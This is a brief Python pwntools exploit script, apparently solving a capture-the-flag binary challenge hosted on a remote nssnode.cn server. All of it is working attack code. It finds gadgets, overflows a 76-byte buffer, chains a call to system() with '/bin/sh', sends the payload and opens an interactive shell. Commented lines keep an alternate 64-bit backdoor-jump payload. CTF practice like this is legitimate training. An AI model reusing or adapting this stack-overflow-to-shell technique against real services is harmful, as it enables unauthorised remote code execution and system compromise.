from pwn import *

context(os="linux", arch="i386", log_level="debug")

p = remote("node5.anna.nssnode.cn", 28028)
OFFSET=76
elf = ELF("temp/pwn-2")
rop = ROP(elf)
#backdoor = elf.symbols["backdoor"]
ret = rop.find_gadget(['ret']).address
#poprdi = rop.find_gadget(["pop rdi", "ret"]).address
#payload = b'a'*24 + p64(ret) + p64(backdoor)
binsh = next(elf.search(b"/bin/sh\x00"))
system_addr = elf.plt["system"]
payload = flat(b"A" * OFFSET, system_addr, 0x12345678, binsh)

p2 = '-1'
#p.sendlineafter(b'length of your name:', b'-1')
p.sendlineafter(b'o NISACTF', payload)
#p.sendline(payload)

p.interactive()
